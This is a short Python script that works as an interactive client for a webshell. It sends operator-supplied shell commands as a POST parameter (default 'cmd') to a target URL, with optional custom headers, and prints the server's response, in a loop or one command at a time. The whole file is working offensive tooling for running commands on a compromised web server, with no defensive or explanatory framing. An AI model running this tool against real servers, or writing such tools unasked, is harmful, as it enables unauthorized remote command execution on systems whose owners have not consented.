#! /usr/bin/python3

import requests
import argparse
import html2text
import sys


parser = argparse.ArgumentParser('get a webshell with url, and use <param> as command post param (by default cmd)')
parser.add_argument('--header', action='append', help='add header')
parser.add_argument('--param', default='cmd', help='param with command to use')
parser.add_argument('--cmd', help='command to send')
parser.add_argument('--html2text', action='store_true', help='print html on text mode')
parser.add_argument('url')

args = parser.parse_args()

url = args.url
param = args.param
cmd = args.cmd





def execute(cmd, headers, h2t):
	
    r = requests.post(url, data={param: cmd}, headers=headers)
 
    print(r.request.url)

    t = r.text
    if h2t:
        t = html2text.html2text(t)
    print(t)


headers = {}
if args.header:
    for header in args.header:
        key = header.split(':')[0]
        value = header[header.index(': ')+2:]
        headers[key] = value

if cmd is not None:
    execute(cmd, headers, args.html2text)
else:	
    while True:
        c = input('--> ')
        execute(c, headers, args.html2text)
    


